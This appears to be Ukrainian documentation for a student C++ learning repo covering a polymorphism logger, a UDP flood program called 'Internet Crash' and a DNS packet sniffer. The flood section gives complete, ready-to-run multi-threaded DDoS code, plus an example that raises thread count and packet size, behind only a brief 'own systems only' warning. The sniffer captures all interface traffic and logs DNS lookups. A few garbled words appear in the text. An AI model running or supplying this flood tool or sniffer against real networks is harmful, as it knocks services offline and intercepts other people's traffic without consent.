# 📚 API_UK.md - Документація API та примери

## 📋 Зміст

- [Огляд архітектури](#огляд-архітектури)
- [Polymorphism Logger](#polymorphism-logger)
- [Internet Crash](#internet-crash)
- [Network Sniffer](#network-sniffer)
- [STL контейнери](#stl-контейнери)
- [Практичні приклади](#практичні-приклади)

---

## 🏗️ Огляд архітектури

### Структура проекту

```
university_learning/
├── polymorphism_logger_demo.cpp  # ООП - Поліморфізм
├── internet crash.cpp             # Мережеві технології - DDoS
├── sniffer.cpp                    # Мережеві технології - Аналіз
└── README.md                      # Зауваження про користування
```

### Теми вивчення

| Файл | Тема | Концепція | Рівень |
|------|------|----------|--------|
| **polymorphism_logger_demo.cpp** | ООП | Спадкування, Вірт. методи | Середній |
| **internet crash.cpp** | Мережа | WinSock2, Threading, Atomic | Просунутий |
| **sniffer.cpp** | Мережа | RAW Sockets, DNS, Binary structures | Просунутий |

---

## 🎯 Polymorphism Logger

### Огляд

Демонстрація полі морфізму в C++ через систему логування з різними типами вивід.

### Архітектура

```
Logger (базовий клас)
├── FileLogger
└── EncryptLogger
```

### Код

```cpp
#include <iostream>
#include <vector>
using namespace std;

// ===== БАЗОВИЙ КЛАС =====
class Logger {
public:
    virtual void log(string message) {
        cout << " Base log : " << message << endl;
    }
    virtual ~Logger() {}
};

// ===== ПОХІДНІ КЛАСИ =====
class FileLogger : public Logger {
public:
    void log(string message) override {
        cout << " File : " << message << endl;
    }
};

class EncryptLogger : public Logger {
public:
    void log(string message) override {
        cout << "Encrypted log :  " << message << "? ? ? ? ? ? ? ?" << endl;
    }
};

// ===== ВИКОРИСТАННЯ =====
int main() {
    vector<Logger*> loggers;
    loggers.push_back(new Logger());
    loggers.push_back(new FileLogger());
    loggers.push_back(new EncryptLogger());
    
    for (Logger* loggerPtr : loggers) {
        loggerPtr->log("Text message");
    }
    
    // Звільнення пам'яті
    for (Logger* loggerPtr : loggers) {
        delete loggerPtr;
    }
    loggers.clear();
    
    return 0;
}
```

### Вивід

```
Base log : Text message
File : Text message
Encrypted log :  Text message? ? ? ? ? ? ? ?
```

### API

#### Клас Logger

```cpp
class Logger {
public:
    virtual void log(string message) { }     // Вивід логу
    virtual ~Logger() { }                    // Віртуальний деструктор
};
```

**Методи:**
- `log(string message)` - Логування повідомлення

#### Клас FileLogger

```cpp
class FileLogger : public Logger {
public:
    void log(string message) override { }    // Переопис базового методу
};
```

#### Клас EncryptLogger

```cpp
class EncryptLogger : public Logger {
public:
    void log(string message) override { }    // Переопис базового методу
};
```

### Приклади розширення

#### Додавання DatabaseLogger

```cpp
class DatabaseLogger : public Logger {
private:
    string _connectionString;
    
public:
    DatabaseLogger(string connStr) : _connectionString(connStr) { }
    
    void log(string message) override {
        cout << "[DB] " << _connectionString << " -> " << message << endl;
    }
};

// Використання
int main() {
    vector<Logger*> loggers;
    loggers.push_back(new DatabaseLogger("Server=localhost;DB=logs"));
    loggers[0]->log("Database entry");
    delete loggers[0];
    return 0;
}
```

#### Додавання ConsoleColorLogger

```cpp
class ConsoleColorLogger : public Logger {
public:
    void log(string message) override {
        cout << "\033[32m[SUCCESS] " << message << "\033[0m" << endl;
    }
};
```

---

## 🌐 Internet Crash

### Огляд

Демонстрація DDoS-атаки (UDP Flood) для навчальних цілей.

⚠️ **ВАРУВАННЯ:** Використовувати ТІЛЬКИ на власних системах для тестування!

### Архітектура

```
Основна програма
├── WinSock2 Ініціалізація
├── Потоки (16 за замовчуванням)
│   └── flood() функція
└── Керування (stop_flag)
```

### Код

```cpp
#include <iostream>
#include <vector>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <atomic>
#include <random>
#pragma comment(lib, "ws2_32.lib")

std::atomic<bool> stop_flag(false);
const char* TARGET_IP = "192.168.1.1";      // Вказати IP
const int THREAD_COUNT = 16;                // Кількість потоків

void flood() {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;
    
    // Збільшення буфера відправки
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));
    
    sockaddr_in target = {};
    target.sin_family = AF_INET;
    inet_pton(AF_INET, TARGET_IP, &target.sin_addr);
    
    // Подання випадкових даних
    char data[1450];
    std::fill_n(data, 1450, 'X');
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 65535);
    
    while (!stop_flag) {
        target.sin_port = htons(dis(gen));
        sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&target, sizeof(target));
    }
    closesocket(sock);
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }
    
    std::cout << "Запуск DDoS на: " << TARGET_IP << std::endl;
    std::cout << "Натисніть Enter для зупинки..." << std::endl;
    
    // Створення потоків
    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(flood);
    }
    
    std::cin.get();
    stop_flag = true;
    
    // Очікування завершення потоків
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
    
    WSACleanup();
    return 0;
}
```

### API

#### Глобальні змінні

```cpp
std::atomic<bool> stop_flag;      // Прапор зупинки (потокобезпечна)
const char* TARGET_IP;            // IP адреса цілі
const int THREAD_COUNT;           // Кількість потоків
```

#### Функція flood()

```cpp
void flood() {
    // Створює UDP сокет
    // Наповнює буфер даними
    // Отправляє пакети до завершення
}
```

**Параметри:** Нема

**Повертає:** void

**Описання:** Основна функція на розповсюдження для кожного потока

#### Функція main()

```cpp
int main() {
    // Ініціалізація WinSock2
    // Запуск потоків
    // Очікування вводу користувача
    // Очистка ресурсів
}
```

### Структури

```cpp
// WinSock2 адреса
sockaddr_in target;
target.sin_family = AF_INET;           // IPv4
target.sin_addr.s_addr = inet_addr(ip); // IP адреса
target.sin_port = htons(port);         // Номер порту
```

### Прапори та налаштування

| Параметр | Значення | Описание |
|----------|----------|----------|
| SOCK_DGRAM | UDP | Протокол |
| SO_SNDBUF | 4MB | Розмір буфера |
| THREAD_COUNT | 16 | Потоків |
| Розмір пакету | 1450 | байт |

---

## 📡 Network Sniffer

### Огляд

Аналізатор мережевих пакетів для перехвату DNS запитів на Windows.

### Архітектура

```
NetworkMonitor
├── Ініціалізація RAW сокету
├── Прив'язка до інтерфейсу
├── Запуск перехоплення
└── Обробка DNS запитів
```

### Код

```cpp
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ctime>
#pragma comment(lib, "ws2_32.lib")

// ===== СТРУКТУРИ ЗАГОЛОВКІВ =====
#pragma pack(push, 1)
struct IPHeader {
    uint8_t  v_hl;
    uint8_t  tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag_offset;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t src_addr;
    uint32_t dst_addr;
};

struct UDPHeader {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
    uint16_t checksum;
};
#pragma pack(pop)

// ===== МОНІТОР МЕРЕЖІ =====
class NetworkMonitor {
private:
    SOCKET _socket;
    bool _is_running;
    
    std::string get_timestamp() {
        time_t now = time(0);
        tm ltm;
        localtime_s(&ltm, &now);
        char buf[20];
        strftime(buf, sizeof(buf), "%H:%M:%S", &ltm);
        return std::string(buf);
    }
    
    void process_dns_query(const uint8_t* payload, int size) {
        const uint8_t* query_ptr = payload + 12;
        std::string domain = "";
        
        while (*query_ptr != 0 && (query_ptr - payload) < size) {
            int len = *query_ptr++;
            for (int i = 0; i < len; ++i) {
                domain += (char)*query_ptr++;
            }
            if (*query_ptr != 0) domain += ".";
        }
        
        if (!domain.empty()) {
            std::cout << "[" << get_timestamp() << "] DNS: " << domain << std::endl;
        }
    }

public:
    NetworkMonitor() : _socket(INVALID_SOCKET), _is_running(false) {}
    
    bool initialize(const std::string& interface_ip) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return false;
        
        _socket = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
        if (_socket == INVALID_SOCKET) return false;
        
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        inet_pton(AF_INET, interface_ip.c_str(), &addr.sin_addr);
        addr.sin_port = htons(0);
        
        if (bind(_socket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) return false;
        
        unsigned long mode = RCVALL_ON;
        if (ioctlsocket(_socket, SIO_RCVALL, &mode) == SOCKET_ERROR) return false;
        
        _is_running = true;
        return true;
    }
    
    void run() {
        std::vector<uint8_t> buffer(65535);
        std::cout << "--- SNIFFER STARTED ---" << std::endl;
        
        while (_is_running) {
            int bytes_read = recv(_socket, (char*)buffer.data(), buffer.size(), 0);
            if (bytes_read < sizeof(IPHeader)) continue;
            
            IPHeader* iph = reinterpret_cast<IPHeader*>(buffer.data());
            
            // Фільтруємо UDP пакети (протокол 17)
            if (iph->protocol == 17) {
                int ip_hlen = (iph->v_hl & 0x0F) * 4;
                UDPHeader* udph = reinterpret_cast<UDPHeader*>(buffer.data() + ip_hlen);
                
                // DNS запити на порту 53
                if (ntohs(udph->dst_port) == 53) {
                    process_dns_query(buffer.data() + ip_hlen + sizeof(UDPHeader),
                        bytes_read - ip_hlen - sizeof(UDPHeader));
                }
            }
        }
    }
    
    ~NetworkMonitor() {
        if (_socket != INVALID_SOCKET) closesocket(_socket);
        WSACleanup();
    }
};

int main() {
    NetworkMonitor sniffer;
    if (sniffer.initialize("192.168.0.12")) {
        sniffer.run();
    }
    return 0;
}
```

### API

#### Клас NetworkMonitor

```cpp
class NetworkMonitor {
public:
    bool initialize(const std::string& interface_ip);
    void run();
    ~NetworkMonitor();
};
```

**Методи:**

1. `initialize(interface_ip)` - Ініціалізація перехоплення
   - **Параметр:** IP адреса інтерфейсу
   - **Повертає:** true якщо успіх

2. `run()` - Запуск перехоплення пакетів
   - **Параметри:** Нема
   - **Повертає:** void

#### Структури

```cpp
struct IPHeader {
    uint8_t  v_hl;           // Версія та довжина заголовку
    uint8_t  tos;            // Type of Service
    uint16_t total_len;      // Загальна довжина пакету
    uint16_t id;             // Ідентифікатор
    uint16_t frag_offset;    // Offset фрагменту
    uint8_t  ttl;            // Time to Live
    uint8_t  protocol;       // Протокол (17 = UDP)
    uint16_t checksum;       // Контрольна сума
    uint32_t src_addr;       // Адреса відправника
    uint32_t dst_addr;       // Адреса одержувача
};

struct UDPHeader {
    uint16_t src_port;       // Порт відправника
    uint16_t dst_port;       // Порт одержувача
    uint16_t length;         // Довжина UDP
    uint16_t checksum;       // Контрольна сума
};
```

---

## 🔧 STL контейнери

### Використовані STL структури

#### vector

```cpp
std::vector<Logger*> loggers;      // Динамічний масив вказівників
std::vector<std::thread> threads;  // Вектор потоків
std::vector<uint8_t> buffer;       // Буфер байт
```

**Методи:**
```cpp
push_back(element)      // Додати елемент
emplace_back(args)      //创ать та додати
clear()                 // Очистити
data()                  // Отримати указатель на дані
size()                  // Розмір
```

#### string

```cpp
std::string domain;     // Строка
std::string message;    // Повідомлення
```

**Методи:**
```cpp
empty()                 // Пуста?
+=                      // Конкатенація
```

#### atomic

```cpp
std::atomic<bool> stop_flag;  // Потокобезпечна змінна
```

**Операції:**
```cpp
load()                  // Читати
store(value)            // Записати
```

---

## 💡 Практичні приклади

### Приклад 1: Розширення Logger системи

```cpp
#include <iostream>
#include <vector>
#include <fstream>
using namespace std;

// Базовий клас
class Logger {
public:
    virtual void log(string message) = 0;  // Чисто віртуа��ьний
    virtual ~Logger() = default;
};

// Файловий логер
class FileLogger : public Logger {
private:
    ofstream _file;
    
public:
    FileLogger(string filename) {
        _file.open(filename, ios::app);
    }
    
    void log(string message) override {
        if (_file.is_open()) {
            _file << message << endl;
            _file.flush();
        }
    }
    
    ~FileLogger() {
        if (_file.is_open()) _file.close();
    }
};

int main() {
    vector<Logger*> loggers;
    loggers.push_back(new FileLogger("log.txt"));
    
    for (auto logger : loggers) {
        logger->log("Запис у файл");
        delete logger;
    }
    
    return 0;
}
```

### Приклад 2: Настройка Internet Crash

```cpp
// Змінення параметрів
const char* TARGET_IP = "192.168.1.1";     // Вкажіть IP
const int THREAD_COUNT = 32;               // Більше потоків
const int PACKET_SIZE = 2048;              // Більший пакет

// Контроль порту
const int START_PORT = 1024;
const int END_PORT = 65535;

std::uniform_int_distribution<> dis(START_PORT, END_PORT);
```

### Приклад 3: Фільтрування в Sniffer

```cpp
// Фільтруємо специфічні порти
if (ntohs(udph->dst_port) == 53 ||        // DNS
    ntohs(udph->dst_port) == 80 ||        // HTTP
    ntohs(udph->dst_port) == 443) {       // HTTPS
    process_packet(buffer.data(), bytes_read);
}
```

---

**Версія:** 1.0  
**Оновлено:** 2026-05-08  
**Автор:** mrdbv
